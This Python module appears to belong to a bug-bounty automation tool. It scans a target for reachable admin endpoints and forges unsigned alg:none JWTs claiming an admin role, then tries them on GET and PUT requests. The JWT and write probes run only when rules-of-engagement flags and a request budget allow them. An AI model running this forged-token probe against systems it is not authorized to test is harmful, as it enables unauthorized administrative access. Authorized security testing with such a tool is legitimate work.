"""Auth-bypass probe — admin path discovery and JWT alg:none bypass (GET + write)."""

from __future__ import annotations

import base64
import json
import time
from urllib.parse import urljoin

import httpx

from earn_money.recon.signals import Signal
from earn_money.triage import hashing

ADMIN_PATHS: tuple[str, ...] = (
    "/admin",
    "/api/Users",
    "/api/SecurityAnswers",
    "/api/Feedbacks",
    "/rest/admin/application-configuration",
    "/administration",
    "/manage",
    "/management",
    "/admin/users",
    "/api/admin",
)

_LOGIN_INDICATORS = ("login", "signin", "sign-in", "authenticate", "401", "403")


def _make_alg_none_jwt(email: str = "admin@example.com", role: str = "admin") -> str:
    header = base64.urlsafe_b64encode(
        json.dumps({"typ": "JWT", "alg": "none"}).encode()
    ).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({"email": email, "role": role}).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{payload}."


def _is_login_redirect(resp: httpx.Response) -> bool:
    if resp.status_code in (301, 302, 303, 307, 308):
        loc = resp.headers.get("location", "").lower()
        return any(ind in loc for ind in _LOGIN_INDICATORS)
    body_lower = resp.text.lower()[:500]
    return any(ind in body_lower for ind in _LOGIN_INDICATORS)


def probe_service(
    base_url: str,
    *,
    client: httpx.Client,
    run_id: str,
    observed_at: str,
    auth_testing_authorized: bool = False,
    mutation_testing_authorized: bool = False,
    auth_lockout_budget: int = 0,
    authorized_test_accounts: tuple[str, ...] = (),
    request_interval: float = 0.0,
) -> list[Signal]:
    """Probe `base_url` for admin path access and JWT alg:none bypass."""
    signals: list[Signal] = []

    for path in ADMIN_PATHS:
        url = urljoin(base_url, path)
        try:
            resp = client.get(url)
            if request_interval:
                time.sleep(request_interval)
        except httpx.HTTPError:
            continue
        if resp.status_code == 200 and not _is_login_redirect(resp):
            content_type = resp.headers.get("content-type", "")
            if "/api/" in path and "application/json" not in content_type:
                continue
            if len(resp.content) < 50:
                continue
            # Only confirm auth gate when auth testing is authorized — sending
            # a token-bearing request to an unauthorized program violates RoE.
            if auth_testing_authorized:
                try:
                    check = client.get(url, headers={"Authorization": "Bearer invalid_probe"})
                    if request_interval:
                        time.sleep(request_interval)
                    if check.status_code == 200 and not _is_login_redirect(check):
                        continue
                except httpx.HTTPError:
                    pass
            signals.append(_make_signal(
                url, "admin_path_open",
                f"status={resp.status_code} len={len(resp.text)}",
                run_id=run_id, observed_at=observed_at,
            ))

    # JWT-bearing probes require explicit RoE authorization and a positive budget.
    if not auth_testing_authorized or auth_lockout_budget <= 0:
        return signals

    test_email = authorized_test_accounts[0] if authorized_test_accounts else "admin@example.com"
    jwt = _make_alg_none_jwt(email=test_email)
    api_paths = [p for p in ADMIN_PATHS if "/api/" in p]

    write_authorized = auth_testing_authorized and mutation_testing_authorized
    jwt_remaining = auth_lockout_budget
    get_jwt_cap = (jwt_remaining - 1) if write_authorized else jwt_remaining

    for path in api_paths:
        if get_jwt_cap <= 0 or jwt_remaining <= 0:
            break
        api_url = urljoin(base_url, path)
        try:
            resp = client.get(api_url, headers={"Authorization": f"Bearer {jwt}"})
            if request_interval:
                time.sleep(request_interval)
            jwt_remaining -= 1
            get_jwt_cap -= 1
            if resp.status_code == 200 and not _is_login_redirect(resp):
                signals.append(_make_signal(
                    api_url, "jwt_alg_none",
                    f"status={resp.status_code} len={len(resp.text)}",
                    run_id=run_id, observed_at=observed_at,
                ))
        except httpx.HTTPError:
            jwt_remaining -= 1
            get_jwt_cap -= 1

    if write_authorized and jwt_remaining > 0:
        for path in api_paths:
            if jwt_remaining <= 0:
                break
            sig = _probe_jwt_alg_none_write(
                path, base_url, jwt=jwt, client=client,
                run_id=run_id, observed_at=observed_at,
                request_interval=request_interval,
            )
            jwt_remaining -= 1
            if sig:
                signals.append(sig)

    return signals


def _probe_jwt_alg_none_write(
    path: str, base_url: str,
    *, jwt: str, client: httpx.Client, run_id: str, observed_at: str,
    request_interval: float = 0.0,
) -> Signal | None:
    write_url = urljoin(base_url, path.rstrip("/") + "/99999")
    try:
        baseline = client.put(
            write_url, headers={"Content-Type": "application/json"}, content=b"{}",
        )
        if request_interval:
            time.sleep(request_interval)
    except httpx.HTTPError:
        return None
    if baseline.status_code not in (401, 403):
        return None
    try:
        resp = client.put(
            write_url,
            headers={"Authorization": f"Bearer {jwt}", "Content-Type": "application/json"},
            content=b"{}",
        )
    except httpx.HTTPError:
        return None
    if resp.status_code in (401, 403):
        return None
    # Only 404 confirms auth bypass without state mutation: server accepted the JWT
    # and processed past auth, but the resource ID 99999 doesn't exist.
    if resp.status_code != 404:
        return None
    return _make_signal(
        write_url, "jwt_alg_none_write",
        f"status={resp.status_code} (expected 401/403 — write auth bypassed)",
        run_id=run_id, observed_at=observed_at,
    )


def _make_signal(
    url: str, kind: str, evidence: str,
    *, run_id: str, observed_at: str,
) -> Signal:
    asset = hashing.normalize_asset(url)
    target = hashing.normalize_target(url)
    signature = f"auth-bypass|{kind}|{target[:20]}"
    payload = json.dumps(
        {"url": url, "kind": kind, "evidence": evidence, "severity": "high"},
        sort_keys=True,
    )
    return Signal(
        run_id=run_id, tool="auth-bypass-probe", signal_type="auth_bypass_candidate",
        asset=asset, target=target, signature=signature,
        payload=payload, observed_at=observed_at,
    )
